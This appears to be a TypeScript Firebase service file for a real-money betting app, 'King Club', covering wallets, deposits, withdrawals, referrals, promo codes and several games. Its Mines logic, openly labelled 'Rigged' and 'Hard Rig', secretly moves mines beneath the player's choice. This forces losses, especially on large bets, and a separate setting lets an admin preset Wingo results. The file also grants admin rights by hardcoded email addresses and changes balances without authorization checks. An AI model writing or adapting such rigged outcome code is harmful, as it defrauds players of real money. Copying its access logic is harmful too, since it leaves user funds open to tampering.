import { ref, get, set, update, push, child, runTransaction, query, limitToLast, remove } from 'firebase/database';
import { db } from '../firebase';
import { UserProfile, Transaction, SystemSettings, PromoCode, BannerItem } from '../types';

// --- PLACEHOLDER LOGIC ---
export const processPlaceholders = (text: string, user: UserProfile): string => {
    if (!text) return "";
    return text
        .replace(/#username/g, user.displayName || "User")
        .replace(/#userid/g, user.numericId || "N/A")
        .replace(/#userclaim/g, user.lastDailyClaim || "Never")
        .replace(/#totaldeposit/g, (user.totalDeposited || 0).toString())
        .replace(/#lastdeposit/g, (user.lastDepositAmount || 0).toString())
        .replace(/#balance/g, (user.balance || 0).toFixed(2))
        .replace(/#winbalance/g, (user.winningBalance || 0).toFixed(2))
        .replace(/#referearn/g, (user.referralEarnings || 0).toFixed(2))
        .replace(/#refercount/g, (user.referralCount || 0).toString())
        .replace(/#referby/g, user.referredBy || "System")
        .replace(/#email/g, user.email || "N/A")
        .replace(/#bonus/g, (user.bonusBalance || 0).toFixed(2))
        .replace(/#bet/g, (user.totalWagered || 0).toFixed(2))
        .replace(/#vip/g, (user.vipLevel || 1).toString());
};

// --- HELPER FUNCTIONS FOR BALANCE MANAGEMENT ---

const initUserBalances = (user: UserProfile) => {
    if (user.depositBalance === undefined) user.depositBalance = 0;
    if (user.bonusBalance === undefined) user.bonusBalance = 0;
    if (user.winningBalance === undefined) {
        user.winningBalance = user.balance || 0;
    }
    user.balance = (user.depositBalance || 0) + (user.winningBalance || 0) + (user.bonusBalance || 0);
};

const deductBetAmount = (user: UserProfile, amount: number) => {
    initUserBalances(user);
    let remaining = amount;
    if (user.bonusBalance! > 0) {
        const take = Math.min(user.bonusBalance!, remaining);
        user.bonusBalance! -= take;
        remaining -= take;
    }
    if (remaining > 0 && user.depositBalance! > 0) {
        const take = Math.min(user.depositBalance!, remaining);
        user.depositBalance! -= take;
        remaining -= take;
    }
    if (remaining > 0) {
        user.winningBalance! -= remaining;
    }
    user.balance = (user.depositBalance || 0) + (user.winningBalance || 0) + (user.bonusBalance || 0);
};

const addWinningAmount = (user: UserProfile, amount: number) => {
    initUserBalances(user);
    user.winningBalance = (user.winningBalance || 0) + amount;
    user.balance = (user.depositBalance || 0) + (user.winningBalance || 0) + (user.bonusBalance || 0);
};

const addBonusAmount = (user: UserProfile, amount: number) => {
    initUserBalances(user);
    user.bonusBalance = (user.bonusBalance || 0) + amount;
    user.balance = (user.depositBalance || 0) + (user.winningBalance || 0) + (user.bonusBalance || 0);
};

const addDepositAmount = (user: UserProfile, amount: number) => {
    initUserBalances(user);
    user.depositBalance = (user.depositBalance || 0) + amount;
    user.balance = (user.depositBalance || 0) + (user.winningBalance || 0) + (user.bonusBalance || 0);
};

export const getUserProfile = async (uid: string): Promise<UserProfile | null> => {
  const snapshot = await get(ref(db, `users/${uid}`));
  return snapshot.val();
};

export const getSystemSettings = async (): Promise<SystemSettings> => {
  const snap = await get(ref(db, 'system_settings'));
  const val = snap.val() || {};
  const defaults: SystemSettings = {
      referralBonus: 50,
      referralDepositBonusPercent: 5, 
      depositBonusPercent: 0, 
      homeBanners: [{imageUrl: "https://i.imgur.com/Q2f7XyM.png"}],
      adminUpiId: "admin@upi",
      adminQrCodeUrl: "", 
      adminUsdtAddress: "",
      adminUsdtQrCodeUrl: "",
      spinPrizes: [500, 250, 100, 75, 50, 25, 10, 5],
      vipThresholds: [0, 1000, 10000, 50000, 200000, 500000, 1000000, 5000000, 10000000, 50000000],
      vipDailyRewards: [0, 10, 20, 50, 100, 200, 500, 1000, 2000, 5000],
      vipLevelUpRewards: [0, 50, 100, 500, 1000, 5000, 10000, 50000, 100000, 500000],
      minDeposit: 100,
      maxDeposit: 100000,
      minWithdraw: 100,
      maxWithdraw: 100000,
      notificationText: "Welcome to #username's King Club! Your balance: ₹#balance"
  };
  return { ...defaults, ...val };
};

export const updateSystemSettings = async (settings: SystemSettings) => {
  await set(ref(db, 'system_settings'), settings);
};

export const setWingoNextResult = async (num: number | null) => {
    await set(ref(db, 'system_settings/wingo_next_result'), num);
};

export const getWingoNextResult = async (): Promise<number | null> => {
    const snap = await get(ref(db, 'system_settings/wingo_next_result'));
    return snap.val();
};

export const getUidFromReferralCode = async (code: string): Promise<string | null> => {
    const codeRef = ref(db, `referral_codes/${code.toUpperCase()}`);
    const snap = await get(codeRef);
    return snap.val();
};

export const getReferrals = async (referrerUid: string): Promise<UserProfile[]> => {
    const usersRef = ref(db, 'users');
    const snapshot = await get(usersRef);
    if (!snapshot.exists()) return [];
    const users = Object.values(snapshot.val()) as UserProfile[];
    return users.filter(user => user.referredBy === referrerUid);
};

export const getAdmins = async (): Promise<UserProfile[]> => {
    const usersRef = ref(db, 'users');
    const snapshot = await get(usersRef);
    if (!snapshot.exists()) return [];
    const users = Object.values(snapshot.val()) as UserProfile[];
    return users.filter(user => user.role === 'admin');
};

export const findUserByEmail = async (email: string): Promise<UserProfile | null> => {
    const usersRef = ref(db, 'users');
    const snapshot = await get(usersRef);
    if (!snapshot.exists()) return null;
    const users = Object.values(snapshot.val()) as UserProfile[];
    return users.find(user => user.email.toLowerCase() === email.toLowerCase().trim()) || null;
};

export const findUserByNumericId = async (numericId: string): Promise<UserProfile | null> => {
    const usersRef = ref(db, 'users');
    const snapshot = await get(usersRef);
    if (!snapshot.exists()) return null;
    const users = Object.values(snapshot.val()) as UserProfile[];
    return users.find(user => user.numericId === numericId) || null;
};

export const updateUserRole = async (uid: string, role: 'admin' | 'user') => {
    await update(ref(db, `users/${uid}`), { role });
};

export const deleteUserAccount = async (uid: string) => {
    await remove(ref(db, `users/${uid}`));
};

export const createUserProfile = async (uid: string, email: string, name: string, referralCodeInput?: string) => {
  const referralCode = Math.random().toString(36).substring(2, 8).toUpperCase();
  const numericId = Math.floor(100000 + Math.random() * 900000).toString();
  const isAdmin = email === 'admin@eco.com' || email === 'sahil2401@starclub.com' || email === 'sahil24012009@gmail.com';
  const newUser: UserProfile = {
    uid, numericId, email, displayName: name, balance: 0, depositBalance: 0,
    winningBalance: 0, bonusBalance: 0, vipLevel: 1, totalWagered: 0, totalDeposited: 0,
    referralCode, referralCount: 0, referralEarnings: 0, claimedLevelUpRewards: [],
    createdAt: Date.now(), role: isAdmin ? 'admin' : 'user'
  };
  if (referralCodeInput) {
    const referrerUid = await getUidFromReferralCode(referralCodeInput.toUpperCase());
    if (referrerUid) {
        newUser.referredBy = referrerUid;
        const settings = await getSystemSettings();
        const bonus = settings.referralBonus;
        if (bonus > 0) {
            const referrerRef = ref(db, `users/${referrerUid}`);
            await runTransaction(referrerRef, (referrer: UserProfile | null) => {
                if (!referrer) return null;
                addBonusAmount(referrer, bonus);
                referrer.referralCount = (referrer.referralCount || 0) + 1;
                referrer.referralEarnings = (referrer.referralEarnings || 0) + bonus;
                return referrer;
            });
            const newTxKey = push(child(ref(db), 'transactions')).key;
            await set(ref(db, `transactions/${newTxKey}`), {
                id: newTxKey, uid: referrerUid, type: 'referral_bonus', amount: bonus, status: 'completed',
                method: 'System', timestamp: Date.now(), details: `Referred user: ${name}`
            });
        }
    }
  }
  await set(ref(db, `users/${uid}`), newUser);
  await set(ref(db, `referral_codes/${referralCode}`), uid);
  return newUser;
};

export const checkDailyTransactionLimit = async (uid: string): Promise<boolean> => {
    const txRef = ref(db, 'transactions');
    const snapshot = await get(txRef);
    if (!snapshot.exists()) return true;
    const txs = Object.values(snapshot.val()) as Transaction[];
    const today = new Date().toDateString();
    const count = txs.filter(t => 
        t.uid === uid && 
        (t.type === 'deposit' || t.type === 'withdraw') && 
        new Date(t.timestamp).toDateString() === today
    ).length;
    return count < 6;
};

export const createTransaction = async (tx: Omit<Transaction, 'id' | 'status' | 'timestamp'>) => {
  const settings = await getSystemSettings();
  
  // Enforce Daily Limit
  const canProceed = await checkDailyTransactionLimit(tx.uid);
  if (!canProceed) {
      throw new Error("You have reached the daily limit of 6 deposit/withdrawal requests.");
  }

  // Enforce Max Limits
  if (tx.type === 'deposit') {
      if (tx.amount > settings.maxDeposit) {
          throw new Error(`Maximum deposit amount is ₹${settings.maxDeposit}`);
      }
  } else if (tx.type === 'withdraw') {
      if (tx.amount > settings.maxWithdraw) {
          throw new Error(`Maximum withdrawal amount is ₹${settings.maxWithdraw}`);
      }
  }

  const newTxKey = push(child(ref(db), 'transactions')).key;
  const transaction: Transaction = {
    ...tx,
    id: newTxKey!,
    status: 'pending',
    timestamp: Date.now()
  };
  await set(ref(db, `transactions/${newTxKey}`), transaction);
  return newTxKey;
};

export const claimDailyReward = async (uid: string) => {
  const userRef = ref(db, `users/${uid}`);
  const settings = await getSystemSettings();
  const result = await runTransaction(userRef, (user: UserProfile | null) => {
      if (!user) return null;
      const today = new Date().toISOString().split('T')[0];
      if (user.lastDailyClaim === today) return;
      const levelIndex = (user.vipLevel || 1) - 1;
      const rewardAmount = settings.vipDailyRewards[levelIndex] || 0;
      if (rewardAmount === 0) return;
      addBonusAmount(user, rewardAmount);
      user.lastDailyClaim = today;
      return user;
  });
  if (result.committed) return settings.vipDailyRewards[result.snapshot.val().vipLevel - 1] || 0;
  throw new Error("Claim failed");
};

export const claimLevelUpReward = async (uid: string, levelToClaim: number) => {
    const userRef = ref(db, `users/${uid}`);
    const settings = await getSystemSettings();
    const result = await runTransaction(userRef, (user: UserProfile | null) => {
        if (!user || user.vipLevel < levelToClaim) return;
        if ((user.claimedLevelUpRewards || []).includes(levelToClaim)) return;
        const rewardAmount = settings.vipLevelUpRewards[levelToClaim - 1] || 0;
        if (rewardAmount <= 0) return;
        addBonusAmount(user, rewardAmount);
        user.claimedLevelUpRewards = [...(user.claimedLevelUpRewards || []), levelToClaim];
        return user;
    });
    if (result.committed) return settings.vipLevelUpRewards[levelToClaim - 1] || 0;
    throw new Error("Transaction failed");
};

export const approveWithdrawal = async (uid: string, amount: number) => {
    const userRef = ref(db, `users/${uid}`);
    await runTransaction(userRef, (user: UserProfile | null) => {
        if (!user) return null;
        initUserBalances(user);
        let remaining = amount;
        if (user.winningBalance && user.winningBalance > 0) {
            const take = Math.min(user.winningBalance, remaining);
            user.winningBalance -= take;
            remaining -= take;
        }
        if (remaining > 0 && user.depositBalance && user.depositBalance > 0) {
            const take = Math.min(user.depositBalance, remaining);
            user.depositBalance -= take;
            remaining -= take;
        }
        user.balance = (user.depositBalance || 0) + (user.winningBalance || 0) + (user.bonusBalance || 0);
        return user;
    });
};

export const updateUserBalance = async (uid: string, newBalance: number) => {
    const userRef = ref(db, `users/${uid}`);
    await runTransaction(userRef, (user: UserProfile | null) => {
        if(!user) return null;
        initUserBalances(user);
        const diff = newBalance - user.balance;
        if (diff > 0) user.winningBalance = (user.winningBalance || 0) + diff;
        else deductBetAmount(user, Math.abs(diff));
        user.balance = (user.depositBalance || 0) + (user.winningBalance || 0) + (user.bonusBalance || 0);
        return user;
    });
};

export const approveDeposit = async (uid: string, amount: number) => {
    const userRef = ref(db, `users/${uid}`);
    const settings = await getSystemSettings();
    await runTransaction(userRef, (user: UserProfile | null) => {
        if (!user) return null;
        addDepositAmount(user, amount);
        user.totalDeposited = (user.totalDeposited || 0) + amount;
        user.lastDepositAmount = amount; // Track for placeholders
        if (settings.depositBonusPercent > 0) {
            addBonusAmount(user, (amount * settings.depositBonusPercent) / 100);
        }
        return user;
    });
};

export const placeBet = async (uid: string, amount: number) => {
  const userRef = ref(db, `users/${uid}`);
  const settings = await getSystemSettings();
  const result = await runTransaction(userRef, (user: UserProfile | null) => {
      if (!user || user.balance < amount) return;
      deductBetAmount(user, amount);
      user.totalWagered = (user.totalWagered || 0) + amount;
      let newLevel = 1;
      for (let i = settings.vipThresholds.length - 1; i >= 0; i--) {
          if (user.totalWagered >= settings.vipThresholds[i]) {
              newLevel = i + 1; break;
          }
      }
      user.vipLevel = Math.max(user.vipLevel, Math.min(10, newLevel));
      return user;
  });
  return result.committed ? { success: true, newBalance: result.snapshot.val().balance } : { success: false, error: "Insufficient balance" };
};

export const placeWingoBet = async (uid: string, amount: number, selection: any, period: number, tab: string) => {
    const res = await placeBet(uid, amount);
    if (res.success) await push(ref(db, `wingo_stage_bets/${tab}/${period}`), { uid, amount, selection, timestamp: Date.now() });
    return res;
};

export const cleanupWingoData = async (tab: string, currentPeriod: number) => {
    const histRef = ref(db, `game_history/wingo/${tab}`);
    const snap = await get(query(histRef, limitToLast(12)));
    if (snap.exists()) {
        const keys = Object.keys(snap.val()).sort();
        if (keys.length > 10) {
            const updates: any = {};
            keys.slice(0, keys.length - 10).forEach(k => { updates[k] = null; });
            await update(histRef, updates);
            await update(ref(db, `wingo_stage_bets/${tab}`), updates);
        }
    }
};

export const processSpin = async (uid: string, betAmount: number) => {
  const settings = await getSystemSettings();
  const weights = [{val:500,c:1},{val:250,c:4},{val:100,c:13},{val:75,c:26},{val:50,c:45},{val:25,c:60},{val:10,c:75},{val:5,c:100}];
  const r = Math.random() * 100;
  let prizeValue = 5;
  for (const w of weights) { if (r < w.c) { prizeValue = w.val; break; } }
  const prizeIndex = settings.spinPrizes.indexOf(prizeValue);
  const userRef = ref(db, `users/${uid}`);
  const result = await runTransaction(userRef, (user: UserProfile | null) => {
      if (!user || user.balance < betAmount) return;
      deductBetAmount(user, betAmount);
      user.totalWagered = (user.totalWagered || 0) + betAmount;
      addWinningAmount(user, prizeValue);
      return user;
  });
  return result.committed ? { success: true, prizeIndex, prizeValue, newBalance: result.snapshot.val().balance } : { success: false, error: "Failed" };
};

export const playRoulette = async (uid: string, bets: any[]) => {
    const totalBet = bets.reduce((s, b) => s + b.amount, 0);
    const outcome = Math.floor(Math.random() * 38);
    const userRef = ref(db, `users/${uid}`);
    let totalWin = 0;
    const result = await runTransaction(userRef, (user: UserProfile | null) => {
        if (!user || user.balance < totalBet) return;
        deductBetAmount(user, totalBet);
        const winNumStr = outcome === 37 ? '00' : String(outcome);
        bets.forEach(bet => {
            if (bet.type === 'number' && String(bet.value) === winNumStr) {
                totalWin += bet.amount * 35;
            }
        });
        if (totalWin > 0) addWinningAmount(user, totalWin);
        return user;
    });
    return { 
        success: result.committed, 
        resultNumber: outcome === 37 ? '00' : outcome, 
        newBalance: result.snapshot?.val()?.balance,
        totalWin,
        error: result.committed ? undefined : "Transaction failed"
    };
};

export const playDragonTiger = async (uid: string, betType: string, amount: number) => {
    const d = Math.floor(Math.random() * 13) + 1;
    const t = Math.floor(Math.random() * 13) + 1;
    let win = 0;
    if (d > t && betType === 'dragon') win = amount * 1.9;
    else if (t > d && betType === 'tiger') win = amount * 1.9;
    else if (t === d && betType === 'tie') win = amount * 9;
    const userRef = ref(db, `users/${uid}`);
    const result = await runTransaction(userRef, (user: UserProfile | null) => {
        if (!user || user.balance < amount) return;
        deductBetAmount(user, amount);
        if (win > 0) addWinningAmount(user, win);
        return user;
    });
    return { 
        success: result.committed, 
        dragonCard: d, 
        tigerCard: t, 
        winAmount: win, 
        newBalance: result.snapshot?.val()?.balance,
        error: result.committed ? undefined : "Transaction failed"
    };
};

export const startMinesGame = async (uid: string, betAmount: number, minesCount: number) => {
    const res = await placeBet(uid, betAmount);
    if (res.success) {
        const grid = Array(25).fill(0);
        let m = 0; while(m < minesCount) { const i = Math.floor(Math.random()*25); if(grid[i]===0){grid[i]=1; m++;}}
        await set(ref(db, `active_games/mines/${uid}`), { grid, betAmount, minesCount, revealed: [], status: 'ACTIVE' });
    }
    return res;
};

// STRATEGY: Rigged reveal with adjusted win chance and bet percentage check
export const revealMinesTile = async (uid: string, index: number) => {
    const gameRef = ref(db, `active_games/mines/${uid}`);
    const snap = await get(gameRef);
    const game = snap.val();
    if (!game || game.status !== 'ACTIVE') return { success: false, error: "Game not active" };
    
    const user = await getUserProfile(uid);
    if (!user) return { success: false };

    const revealedCount = (game.revealed || []).length;
    
    // Strategy: If bet is >= 45% of total balance, 1st click has high chance of mine
    const totalFunds = user.balance + game.betAmount;
    const betPercent = game.betAmount / (totalFunds || 1);
    
    let isMine = game.grid[index] === 1;
    let gridChanged = false;

    // Hard Rig: If 1st click and high bet percentage, force mine with 65% chance
    if (revealedCount === 0 && betPercent >= 0.45 && !isMine && game.betAmount > 100 && Math.random() < 0.65) {
        const mineIndices = game.grid.map((v: number, i: number) => v === 1 ? i : -1).filter((i: number) => i !== -1);
        if (mineIndices.length > 0) {
            const randomMineIdx = mineIndices[Math.floor(Math.random() * mineIndices.length)];
            game.grid[index] = 1;
            game.grid[randomMineIdx] = 0;
            isMine = true;
            gridChanged = true;
        }
    }

    // Secondary Rig: Overall win probability logic
    if (!isMine) {
        const difficultyScalar = Math.min(1, (game.betAmount / 1500)); 
        let winProb = 0.6 * (1 - (difficultyScalar * 0.05)); // ~60% base
        
        // CUSTOM RULE: Small bets (<= 100) have 90% win chance (10% loss)
        if (game.betAmount <= 100) {
            winProb = 0.9;
        }
        
        if (Math.random() > winProb) {
            const mineIndices = game.grid.map((v: number, i: number) => v === 1 ? i : -1).filter((i: number) => i !== -1);
            if (mineIndices.length > 0) {
                const randomMineIdx = mineIndices[Math.floor(Math.random() * mineIndices.length)];
                game.grid[index] = 1;
                game.grid[randomMineIdx] = 0;
                isMine = true;
                gridChanged = true;
            }
        }
    }

    if (gridChanged) {
        await update(gameRef, { grid: game.grid });
    }

    const rev = [...(game.revealed || []), index];
    if (isMine) {
        await update(gameRef, { status: 'LOST', revealed: rev });
        return { success: true, type: 'mine', fullGrid: game.grid, error: undefined };
    }

    const mult = Math.pow(1.15, rev.length);
    await update(gameRef, { revealed: rev });
    return { success: true, type: 'gem', multiplier: mult, payout: game.betAmount * mult, error: undefined };
};

export const cashOutMines = async (uid: string) => {
    const gameRef = ref(db, `active_games/mines/${uid}`);
    const snap = await get(gameRef);
    const game = snap.val();
    if (!game || game.status !== 'ACTIVE') return { success: false, error: "Game not active" };
    const mult = Math.pow(1.15, (game.revealed || []).length);
    const win = game.betAmount * mult;
    await runTransaction(ref(db, `users/${uid}`), (u) => { if(u) addWinningAmount(u, win); return u; });
    await remove(gameRef);
    return { success: true, amount: win, error: undefined };
};

export const createPromoCode = async (code: string, amount: number, maxUses: number, days: number, message: string, requiresDeposit: boolean, requiredDepositAmount: number = 0) => {
    await set(ref(db, `promo_codes/${code.toUpperCase()}`), {
        code: code.toUpperCase(), amount, maxUses, currentUses: 0, 
        expiryDate: Date.now() + (days * 86400000), message, requiresDeposit, requiredDepositAmount, createdAt: Date.now()
    });
};

export const redeemPromoCode = async (uid: string, code: string) => {
    const promoRef = ref(db, `promo_codes/${code.toUpperCase()}`);
    const user = await getUserProfile(uid);
    if (!user) return { success: false, error: "User not found" };

    const res = await runTransaction(promoRef, (p: PromoCode | null) => {
        if (!p || p.currentUses >= p.maxUses || Date.now() > p.expiryDate) return;
        if (p.claimedBy && p.claimedBy[uid]) return;
        
        // Deposit Requirement Check (Cumulative)
        const minReq = p.requiredDepositAmount || 0;
        if ((user.totalDeposited || 0) < minReq) return;

        p.currentUses = (p.currentUses || 0) + 1;
        p.claimedBy = { ...(p.claimedBy || {}), [uid]: true };
        return p;
    });

    if (res.committed) {
        const p = res.snapshot.val();
        await runTransaction(ref(db, `users/${uid}`), (u) => { if(u) addBonusAmount(u, p.amount); return u; });
        
        // Process Placeholders in Promo Message
        const processedMsg = processPlaceholders(p.message, user);
        return { success: true, amount: p.amount, message: processedMsg };
    }
    
    // Determine specific error
    const snap = await get(promoRef);
    const p = snap.val() as PromoCode;
    if (!p) return { success: false, error: "Invalid code" };
    if (Date.now() > p.expiryDate) return { success: false, error: "Code expired" };
    if (p.currentUses >= p.maxUses) return { success: false, error: "Code usage limit reached" };
    if (p.claimedBy && p.claimedBy[uid]) return { success: false, error: "You already claimed this code" };
    if (p.requiredDepositAmount && (user.totalDeposited || 0) < p.requiredDepositAmount) {
        return { success: false, error: `This code requires a minimum cumulative deposit of ₹${p.requiredDepositAmount}` };
    }

    return { success: false, error: "Unable to redeem code" };
};

export const initDemoData = async () => {
    const snap = await get(ref(db, 'system_settings'));
    if (!snap.exists()) {
        await set(ref(db, 'system_settings'), {
            referralBonus: 50, minDeposit: 100, maxDeposit: 100000, minWithdraw: 100, maxWithdraw: 100000,
            vipThresholds: [0, 1000, 10000], vipDailyRewards: [5, 10, 20], vipLevelUpRewards: [50, 100, 200],
            spinPrizes: [500, 250, 100, 75, 50, 25, 10, 5],
            homeBanners: [{imageUrl: "https://i.imgur.com/Q2f7XyM.png"}],
            notificationText: "Welcome to King Club, #username! Good luck!"
        });
    }
};
